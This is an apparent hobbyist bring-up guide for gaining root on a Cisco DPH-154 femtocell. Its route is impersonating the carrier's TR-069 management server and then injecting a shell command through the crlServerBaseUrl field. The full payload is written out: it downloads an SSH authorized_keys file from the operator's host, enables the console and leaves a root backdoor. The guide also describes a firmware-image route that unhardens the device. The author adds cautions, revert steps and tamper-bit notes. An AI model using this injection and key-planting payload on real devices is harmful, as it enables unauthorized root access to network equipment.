# Bring-up: Cisco DPH-154 — the provider-emulation route, and the one bit that stops it

> ## 1️⃣ **BEFORE STEP ONE — CONFIRM WHICH UNIT YOU ARE HOLDING: [`MATRIX.md`](MATRIX.md)**
> **This guide is for the DPH-154: **no config banks at all** · **579** train · ⛔ JP: DO NOT OPEN IT**
> ⇒ ⛔ **If your unit is not that, STOP — the other models differ in ways that have cost this
> project days: bank numbering is REVERSED between the 151 and the nano3G, the 154 has no banks
> at all, and a 579 measurement is not a 563 fact.**
> ✅ **[`MATRIX.md`](MATRIX.md) is the identification table** — `## Identity`, `## Silicon and RF`,
> `## Capability`, `## Access and state`. **Read it first; it is 166 lines and it is the only
> document that tells you WHICH machine you have before you type anything.**
> 📌 **POINTER, NOT A COPY.** `[Wired in 2026-09-14: MATRIX.md existed and NO guide referenced it —
> the identification step was written and orphaned.]`


> ### 📋 EVIDENCE CLASS — and it is genuinely two different answers
> ✅ **ACCESS IS SOLVED.** There is a working route into a DPH-154 that needs **no memory-corruption
> exploit, no JTAG, no case opening and no serial console** — you stand up the management server the
> unit is already looking for, and let its own provisioning path do the work.
> ⛔ **THE RADIO IS SEPARATELY GATED, and on the unit measured here that gate is CLOSED.**
> `X_00000C_Tampered = 1` — **14 readbacks** — and `FAPService.Enabled` is refused with
> **FAULT 9003/9007.**
> ⇒ ⭐ **That is a per-unit condition, not a model-level wall.** A 154 with the bit clear should go
> all the way. **We do not have one, so the last phase is unproven and is labelled as such.**
>
> ⚠️ **An earlier revision of this page said "there is no route in."** That was written from an
> out-of-date reading of the corpus and **was wrong** — the access work had already been done. It is
> corrected here rather than quietly replaced, because *"we could never do X"* is exactly the kind of
> claim that survives past its own refutation.

---

## Why this route exists at all

The 154 is the hardened one. Every direct door is shut, and each of these was **measured**:

| door | state |
|---|---|
| the `wizard` UDP backdoor (works on older siblings) | **port 14677 closed** |
| anything listening | **13 ports probed, 13 closed** — and they are **ICMP-unreachable rejects**, the signature of a **firewall rule**, not of absent listeners |
| catching it phone home and answering as its server | **initiated nothing at all in 60 s of passive capture** |
| a public firmware dump to analyse | none exists, and the only software dump path **requires the access it would provide** |

⇒ **Public exploits are 2012–2018 and target the 151/153. This is a 2019 build.**
⭐ **So you do not attack the PERIMETER. You become the thing it is waiting for — and then you
attack ONE FIELD, from inside the conversation it opened to you voluntarily.**
⚠️ **Both halves matter.** Phase 1 alone gets you a management session and nothing more; Phase 2
alone has no channel to arrive on. **The provider emulation is not the exploit — it is what makes
the exploit reachable.**

---

## Phase 0 — Isolate, as always

The general caution in [`BRINGUP.md`](BRINGUP.md#before-you-plug-anything-in) applies. ⚠️ **On this
model it is doubly true**, because the whole route depends on the unit talking to *your* server
rather than reaching the internet and finding nothing.

---

## Phase 1 — Become its management server

The unit speaks **CWMP/TR-069** to an ACS. **Stand one up and let it connect.** Nothing here is an
exploit: you are answering a protocol the device initiates, with the identity it expects.

⚠️ **The CWMP store and the NV environment are different places, and confusing them costs a day:**
```
our ACS writes  ->  the CWMP store only   (/var/ipaccess/cisco/dslg_cur_cfg.xml.gz)
                    the TR-069 client has NO path to /var/ipaccess/nv_env.sh
```
⇒ **You cannot write the NV environment directly over CWMP.**

> ### ⭐⭐⭐ **NOT DIRECTLY. BUT ONE CWMP-WRITABLE FIELD IS COPIED INTO IT VERBATIM — AND THAT IS THE ROUTE.**
> **You do not need a path to `nv_env.sh`. You need a field the device itself copies there**, and
> `crlServerBaseUrl` is one. ⇒ **Phase 2 is that field.**

---

## Phase 2 — ⭐⭐ The lever: a URL field that is copied into the NV environment unescaped

> ### 🔴🔴 **CORRECTED TWICE ON 2026-09-16, BOTH TIMES BY JP, WHO PERFORMED THE ACCESS.**
> ```
> v1  "serve a firmware image; FS_VARIANT unhardens it"   -> NEVER DONE. Rewrites both U-Boot banks.
> v2  "rewrite the management-server URL so it points     -> WRONG MECHANISM. It is not a pointer
>      at you natively"                                       rewrite; it is COMMAND INJECTION.
> ```
> **His words:** *"we didn't use the software update exploit, we got it all configured like att then
> overwrote the serverurl field through ACS like we did through DMI on the 151"* — and then, on my
> second attempt: *"we just used that field because it dumps directly into init_nv."*
> ⇒ ⭐ **The field is not interesting because of what it POINTS AT. It is interesting because of
> WHERE ITS VALUE IS COPIED TO.**

**`/var/ipaccess/nv_env.sh` is sourced as root early in boot.** Several MIB string attributes are
written into it **verbatim**, as `export VAR="<value>"` lines. **`crlServerBaseUrl` (2203) is one:**

```
set crlServerBaseUrl="http://x/"     ->     export ENV_CRL_BASE_SERVER="http://x/"
```

⛔ **There is NO input validation on that write path.** `;`, backticks, `$()` and `|` all round-trip
unmodified.

> ### 🎯 **THE PARSER OWNS THE DOUBLE QUOTE. IT DOES NOT MATTER.**
> **You cannot close the shell string — the DMI/CWMP parser owns `"`.** ⭐ **You do not need to:
> `$(...)` command substitution executes INSIDE double quotes.**
> ```
> set crlServerBaseUrl="x$(COMMAND)"
> ```
> ⇒ **`COMMAND` runs as root at every boot, when `nv_env.sh` is sourced.**
> ⭐⭐ **This is why the field was chosen, and it is the whole trick:** the value is not parsed as a
> URL by anything that matters before it reaches a shell. **It is a string that gets `export`ed.**

### ⚠️ The caveat that shapes the payload — and it is why this takes TWO reboots

**`$( )` runs in a SUBSHELL, so an `export` inside it cannot affect the parent.** ⇒ To change an NV
variable you must edit the **file** — with the vendor's own `/opt/ipaccess/bin/setnv_env.sh` — and
boot **again**.

```
dropbear is ALWAYS running. Only its BIND ADDRESS varies (/etc/init.d/sshd):
    ENV_VERBOSE_CONSOLE_ENABLED == "TRUE"  ->  LISTEN_ON=22            any interface
    otherwise                              ->  LISTEN_ON=127.0.0.1:22  loopback only
```
⭐ **That is why port 22 scans as REFUSED rather than filtered — it is bound, just not to you.**

**The payload — key install plus console enable, no password needed:**
```
set crlServerBaseUrl="x$(mkdir -p /root/.ssh;wget -O /root/.ssh/authorized_keys \
    http://<you>:9998/k;/opt/ipaccess/bin/setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED TRUE)"
```
```
reboot 1   payload runs as root: installs the key, sets the flag IN THE FILE.
           sshd already started with the OLD value -> still loopback.
reboot 2   sshd reads TRUE -> binds 0.0.0.0:22. SSH in with the key.
```
⚠️ **Legacy crypto is required:** `-o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss`
📌 **Possible second gate:** `ENV_FIREWALL_DISABLED="FALSE"` + `/etc/init.d/iptablesinit` — same
`setnv_env.sh` route if 22 is bound but unreachable.

> ### ⭐⭐⭐ **THE 151 AND THE 154 DIFFER ONLY IN WHICH DOOR CARRIES THE WRITE**
> ```
> DPH-151   the write arrives by DMI    set crlServerBaseUrl="x$(…)"
> DPH-154   the write arrives by ACS    the same field, over CWMP -- because the 154 HAS NO DMI
>                                        CONSOLE. CWMP is the console it still answers on.
> ```
> ⇒ ⭐ **The 154 is not a harder target. It is the SAME target with the console removed.** **The
> sink, the lack of validation and the payload are identical; only the transport changes.**
> ⚠️ **AND THAT IS WHY PHASE 1 MATTERS.** You are not impersonating AT&T to *be* its management
> server — **you are impersonating it to get a writable channel to this one field.**

> ### ⛔ **BOUNDS — STATED PLAINLY, BECAUSE THIS PAGE HAS NOW BEEN WRONG TWICE**
> ```
> ✅ the SINK and the PAYLOAD   measured and documented on the 151 (2g corpus, DEVICE-ACCESS.md
>                               Steps 3-4): MIB 2203 -> ENV_CRL_BASE_SERVER, no validation.
> ✅ the ROUTE on the 154       first-hand from the operator who performed it.
> ⚠️ the CWMP PARAMETER NAME    NOT recorded in this repo. The DMI attribute is crlServerBaseUrl
>                               (2203); its TR-069 name on this vendor-skinned build is UNREAD.
> ⚠️ no staged payload          the ACS in the 2g tree has no such payload -- grepped 2026-09-16.
>                               The write was made; it was not left behind as code.
> ```
> ✅ **ASK THE DEVICE, DO NOT GUESS:** `CWMP GetParameterNames` on the vendor tree (`X_00000C_…`)
> returns the real name. ⭐ **A name probe against the device cannot be wrong about the device's own
> namespace** — and this build renames things.

### ✅ Reverting

```
set crlServerBaseUrl=""      then remove /root/.ssh/authorized_keys
                             and setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED FALSE
```
⚠️ **The payload is idempotent and harmless if left — but leaving a root backdoor armed on a device
is a DECISION, not a default.**

---

## Phase 3 — What you have now

A unit that hardens or unhardens on your instruction, with NV variables you chose — which is the
same primitive the other models reach through a console. **From here the software half of
[`BRINGUP.md`](BRINGUP.md) Phases 4–8 applies**: point it at your core, give the radio parameters,
unlock, connect.

---

## 🔴 Phase 4 — The tamper bit, and why this page stops here

**The radio has its own gate, and it is enforced independently of everything above.**

```
X_00000C_Tampered = 1         14 readbacks, consistent
FAPService.Enabled            REFUSED — FAULT 9003 / 9007
```

⇒ **A tampered unit will provision, accept configuration, and refuse to transmit.** Every other
instrument reads healthy. ⭐ **This is the failure that looks exactly like a configuration mistake
and is not one.**

> ### ⛔ AND THE MOST IMPORTANT THING ON THIS PAGE: **THE BIT CAN BE SET BY YOU, AND IT IS ONE-WAY**
> [`Trap 41`](TRAPS.md#41-opening-the-case-can-destroy-a-factory-configuration) is the full entry.
> **Opening the case and guessing the jumper pattern trips a one-way tamper latch in flash.** The
> pattern is **one-hot — one real jumper among blanks, six candidates** — so a guess is far more
> likely wrong than right.
> ✅ **Leaving jumpers off is safe. Restoring a pattern from memory is not.**
> ⇒ 🎯 **If you buy a 154, buy one that has never been opened, and do not open it.** The route above
> needs no case access at all — **and the case is where the radio gets lost.**

---

## What would finish this guide

**One DPH-154 with `X_00000C_Tampered = 0`**, taken through Phases 1–3 and then the software half of
[`BRINGUP.md`](BRINGUP.md). Specifically still unknown:

- **Whether `FAPService.Enabled` is accepted** once the tamper bit is clear — **the fault codes are
  the only evidence we have, and they were taken on a tampered unit.**
- **Whether the tamper bit is clearable at all.** ⛔ **Assume not.** Nothing here has cleared one, and
  a one-way latch in flash is exactly the sort of thing that is not meant to be.
- **Which config-bank layout applies.** The 154 selects **named UBI volumes, not numbered banks** —
  U-Boot reads a 4-byte `default_bank` value, and `config_bank_1`/`config_bank_2` **do not exist on
  it at all.** ⇒ [`Trap 2`](TRAPS.md#2-which-config-bank-is-live-differs-per-model--and-guessing-kills-the-cell)
  does not apply to this model in the same form.

---

## Two model-specific facts worth having

- **Its U-Boot environment sets `consoledev=/dev/null`** ⇒ **Linux never opens that UART**, and a
  serial capture goes silent after `Starting kernel`. ⚠️ Two people spent ~20 minutes on baud sweeps
  before finding it — **97 % `0x00` is a line held LOW, not misframed data.**
  ⛔ **Do not carry this to another model.** It was measured on the **154's** environment; applying
  it elsewhere has already caused one serial route to be written off wrongly on a different device.
  ⭐ **And note what it does *not* say: U-Boot's own console is a separate stage, and nobody has
  confirmed it dead on a 154.**
- **The external antenna port was deleted** relative to the 151's MCX. ⇒ **The "one room, heavily
  attenuated, remote antenna" deployment is not available on this model.**

> ### ⚠️ One thing this repo nearly published as settled, kept visible
> *"The DPH-154 is not picoChip"* is **not** established. A teardown identifies an **AD9365**
> transceiver with Band 2 and Band 5 power amplifiers; another source attributes a picoChip part.
> ⭐ **These are reconcilable — the AD9365 is the RF transceiver, a picoChip part would be the
> processor/baseband. Different components.** The 154's SoC identity is genuinely unsettled.


---

## 📕 THE ROUTE THAT WAS **NOT** USED — kept verbatim, and it is irreversible

> ### ⛔⛔ **DO NOT RUN THIS TO "GET IN". PHASE 2 IS HOW YOU GET IN.**
> **This section stood as Phase 2 until 2026-09-16 and was wrong about what was done.** It is kept
> because **the analysis is sound and the lever is real** — and because a route that vanishes cannot
> be recognised when someone rediscovers it and assumes it is the supported path.
> ⚠️ **It rewrites BOTH U-Boot banks.** A reader who follows a deleted-and-replaced walkthrough
> would have taken an irreversible step for access they already had.

**There is exactly one CWMP-reachable writer of the NV environment, and it is the software-download
path.** Serve the unit a firmware image and it runs, unprompted:

```
CWMP Download -> swdl_client -> activate_bank -> activate_fs -> set_hardened_state
      (loop-mounts OUR fs.bin, reads FS_VARIANT from its /etc/sw_description.dat)
   -> init_nv_env -> setnv_env.sh <variables>
```

> ### 🎯 **THE LEVER IS NOT THE FILE WRITE. IT IS `FS_VARIANT`, AND IT COMES FROM THE IMAGE YOU SUPPLY.**
> `set_hardened_state` loop-mounts the filesystem **you served** and reads `FS_VARIANT` out of its own
> `/etc/sw_description.dat`. The hardening decision is then **a pure function of the 4th character**:
> ```
> rcS:48   FS_LETTER=$(echo $FS_VARIANT | cut -c4)   ->  DEFAULT_UNHARDENED
>          hardened only for:  A C E G I W X Z
> ```
> ⇒ ⭐ **You choose that character.** The unit hardens or unhardens *itself*, on your say-so, through
> its own vendor code path.

> ### ⚠️ A LATENT DISAGREEMENT BETWEEN TWO IMPLEMENTATIONS OF THE SAME TEST
> ```
> rcS:84-93          A C E G I W X Y Z   (9 letters — INCLUDES Y)
> swdl init_nv_env   A C E G I W X   Z   (8 letters — NO Y)
> ```
> ⇒ **A `…Y…` variant is treated as UNHARDENED by `rcS` and as HARDENED by `swdl_client`.** **Someone
> will trip over it** — and a unit in that state disagrees with itself about what it is.

⛔ **`-noswap` is never passed** (the operation type is hardcoded), so `activate_bank` **does** run —
which means **`uboot-install` rewrites both U-Boot banks first.** ⇒ **This is not a reversible probe.
It rewrites bootloaders.**

📌 **And do not expect `ENV_FIREWALL_DISABLED` in `nv_env.sh` to do anything on its own** — that
value is **dead state** for the running environment. The firewall follows `FS_VARIANT`, not the file.
**The file write is inert; the variant letter is the lever.**
